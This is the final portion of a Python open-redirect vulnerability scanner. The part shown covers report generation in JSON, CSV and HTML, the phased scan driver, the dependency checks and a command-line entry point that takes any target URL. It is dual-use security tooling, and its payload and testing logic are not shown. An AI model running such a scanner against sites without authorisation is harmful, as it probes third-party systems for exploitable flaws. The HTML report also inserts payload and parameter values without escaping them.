            'parameters': [asdict(param) for param in self.parameters],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
        }
        
        with open('parameters.json', 'w', encoding='utf-8') as f:
            json.dump(results_data, f, indent=2, ensure_ascii=False)
        
        # CSV report
        with open('parameters_analysis.csv', 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['name', 'value', 'source', 'context', 'url', 'is_redirect_related', 'confidence']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            
            for param in self.parameters:
                writer.writerow({
                    'name': param.name,
                    'value': param.value[:100],
                    'source': param.source,
                    'context': param.context,
                    'url': param.url,
                    'is_redirect_related': param.is_redirect_related,
                    'confidence': f"{param.confidence:.2f}"
                })
        
        self.logger.info("Results saved to parameters.json and parameters_analysis.csv")
    
    def generate_html_report(self):
        """Generate HTML report"""
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Open Redirect Vulnerability Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }}
        .header {{ text-align: center; color: #d32f2f; margin-bottom: 30px; }}
        .summary {{ background: #e3f2fd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ background: #ffebee; border-left: 4px solid #f44336; padding: 15px; margin: 15px 0; }}
        .parameter {{ background: #f3e5f5; border-left: 4px solid #9c27b0; padding: 10px; margin: 10px 0; }}
        .code {{ background: #f5f5f5; padding: 10px; border-radius: 4px; font-family: monospace; }}
        .success {{ color: #4caf50; font-weight: bold; }}
        .error {{ color: #f44336; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Open Redirect Vulnerability Report</h1>
            <p>Professional Security Assessment</p>
        </div>
        
        <div class="summary">
            <h2>Executive Summary</h2>
            <p><strong>Target:</strong> {self.target_url}</p>
            <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>URLs Crawled:</strong> {len(self.discovered_urls)}</p>
            <p><strong>Parameters Found:</strong> {len(self.parameters)}</p>
            <p><strong>Redirect Parameters:</strong> {len(redirect_params)}</p>
            <p><strong>Vulnerabilities:</strong> <span class="{'error' if len(self.vulnerabilities) > 0 else 'success'}">{len(self.vulnerabilities)}</span></p>
        </div>
"""
        
        if self.vulnerabilities:
            html_content += "<h2>Discovered Vulnerabilities</h2>\n"
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
        <div class="vulnerability">
            <h3>Vulnerability #{i}: {vuln.vulnerability_type}</h3>
            <p><strong>URL:</strong> <code>{vuln.url}</code></p>
            <p><strong>Parameter:</strong> <code>{vuln.parameter}</code></p>
            <p><strong>Payload:</strong></p>
            <div class="code">{vuln.payload}</div>
            <p><strong>Response Code:</strong> {vuln.response_code}</p>
            <p><strong>Redirect URL:</strong> <code>{vuln.redirect_url}</code></p>
            <p><strong>Impact:</strong> <span class="{vuln.impact.lower()}">{vuln.impact}</span></p>
            <p><strong>Confidence:</strong> {vuln.confidence:.1%}</p>
            <p><strong>Remediation:</strong> {vuln.remediation}</p>
"""
                if vuln.screenshot_path:
                    html_content += f'<p><strong>Screenshot:</strong> <img src="{vuln.screenshot_path}" style="max-width:100%;"></p>'
                html_content += "</div>\n"
        else:
            html_content += """
        <div style="text-align: center; padding: 40px; background: #e8f5e8; border-radius: 8px;">
            <h2 class="success">No Open Redirect Vulnerabilities Found</h2>
            <p>The target application appears to be properly protected.</p>
        </div>
"""
        
        html_content += f"""
        <h2>Discovered Parameters</h2>
        <p>Total: {len(self.parameters)} | Redirect-related: {len(redirect_params)}</p>
"""
        
        for param in redirect_params[:10]:
            html_content += f"""
        <div class="parameter">
            <h4>{param.name} (Redirect-Related)</h4>
            <p><strong>Value:</strong> <code>{param.value[:100]}</code></p>
            <p><strong>Source:</strong> {param.source} | <strong>Context:</strong> {param.context}</p>
            <p><strong>URL:</strong> <code>{param.url}</code></p>
            <p><strong>Confidence:</strong> {param.confidence:.1%}</p>
        </div>
"""
        
        html_content += """
        <div style="text-align: center; margin-top: 40px; color: #666;">
            <p>Report generated by Professional Open Redirect Scanner v2.0</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open('open_redirect_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info("HTML report generated: open_redirect_report.html")
    
    async def run_scan(self):
        """Run complete scan"""
        start_time = time.time()
        self.logger.info("Starting Professional Open Redirect Scanner")
        
        try:
            # Initialize
            await self.init_session()
            self.init_driver()
            
            # Phase 1: Crawling
            self.logger.info("Phase 1: Deep crawling and parameter extraction")
            await self.crawl_website()
            
            # Phase 2: Analysis
            self.logger.info("Phase 2: Analyzing redirect parameters")
            redirect_params = [p for p in self.parameters if p.is_redirect_related]
            
            # Phase 3: Testing
            self.logger.info("Phase 3: Testing vulnerabilities")
            await self.test_vulnerabilities()
            
            # Phase 4: Reporting
            self.logger.info("Phase 4: Generating reports")
            self.save_results()
            self.generate_html_report()
            
            # Summary
            scan_duration = time.time() - start_time
            self.logger.info("=== SCAN SUMMARY ===")
            self.logger.info(f"Duration: {scan_duration:.2f} seconds")
            self.logger.info(f"URLs crawled: {len(self.discovered_urls)}")
            self.logger.info(f"Parameters found: {len(self.parameters)}")
            self.logger.info(f"Redirect parameters: {len(redirect_params)}")
            self.logger.info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
            
            if self.vulnerabilities:
                self.logger.info("VULNERABILITIES DETECTED:")
                for vuln in self.vulnerabilities:
                    self.logger.info(f"  {vuln.parameter} -> {vuln.payload} ({vuln.impact})")
            
            print("\n" + "="*60)
            print("SCAN COMPLETED SUCCESSFULLY!")
            print(f"HTML Report: open_redirect_report.html")
            print(f"JSON Data: parameters.json")
            print(f"CSV Analysis: parameters_analysis.csv")
            if self.vulnerabilities and SELENIUM_AVAILABLE:
                print(f"Screenshots: screenshots/")
            print("="*60)
            
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
            raise
        finally:
            if self.session:
                await self.session.close()
            if self.driver:
                self.driver.quit()


def check_dependencies():
    """Check required dependencies"""
    missing = []
    
    if not AIOHTTP_AVAILABLE:
        missing.append("aiohttp")
    
    print("Checking dependencies...")
    print(f"aiohttp: {'OK' if AIOHTTP_AVAILABLE else 'MISSING'}")
    print(f"selenium: {'OK' if SELENIUM_AVAILABLE else 'MISSING (screenshots disabled)'}")
    print(f"beautifulsoup4: {'OK' if BS4_AVAILABLE else 'MISSING (basic HTML parsing)'}")
    
    return len(missing) == 0


async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Professional Open Redirect Scanner')
    parser.add_argument('target', nargs='?', help='Target URL to scan')
    parser.add_argument('--depth', type=int, default=3, help='Max crawling depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='Max pages to crawl (default: 100)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    parser.add_argument('--check-deps', action='store_true', help='Check dependencies')
    
    args = parser.parse_args()
    
    if args.check_deps:
        check_dependencies()
        return
    
    if not args.target:
        print("ERROR: Please provide target URL")
        print("Usage: python3 open_redirect_scanner_final.py https://target.com")
        return
    
    # Normalize URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check dependencies
    if not check_dependencies():
        print("\nInstall missing dependencies:")
        print("pip3 install aiohttp beautifulsoup4 selenium")
        return
    
    print(f"\nStarting scan: {args.target}")
    print(f"Settings: depth {args.depth}, max {args.max_pages} pages")
    
    # Run scanner
    scanner = OpenRedirectScanner(args.target, args.depth, args.max_pages)
    await scanner.run_scan()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"Error: {e}")
        logging.error(f"Fatal error: {e}", exc_info=True)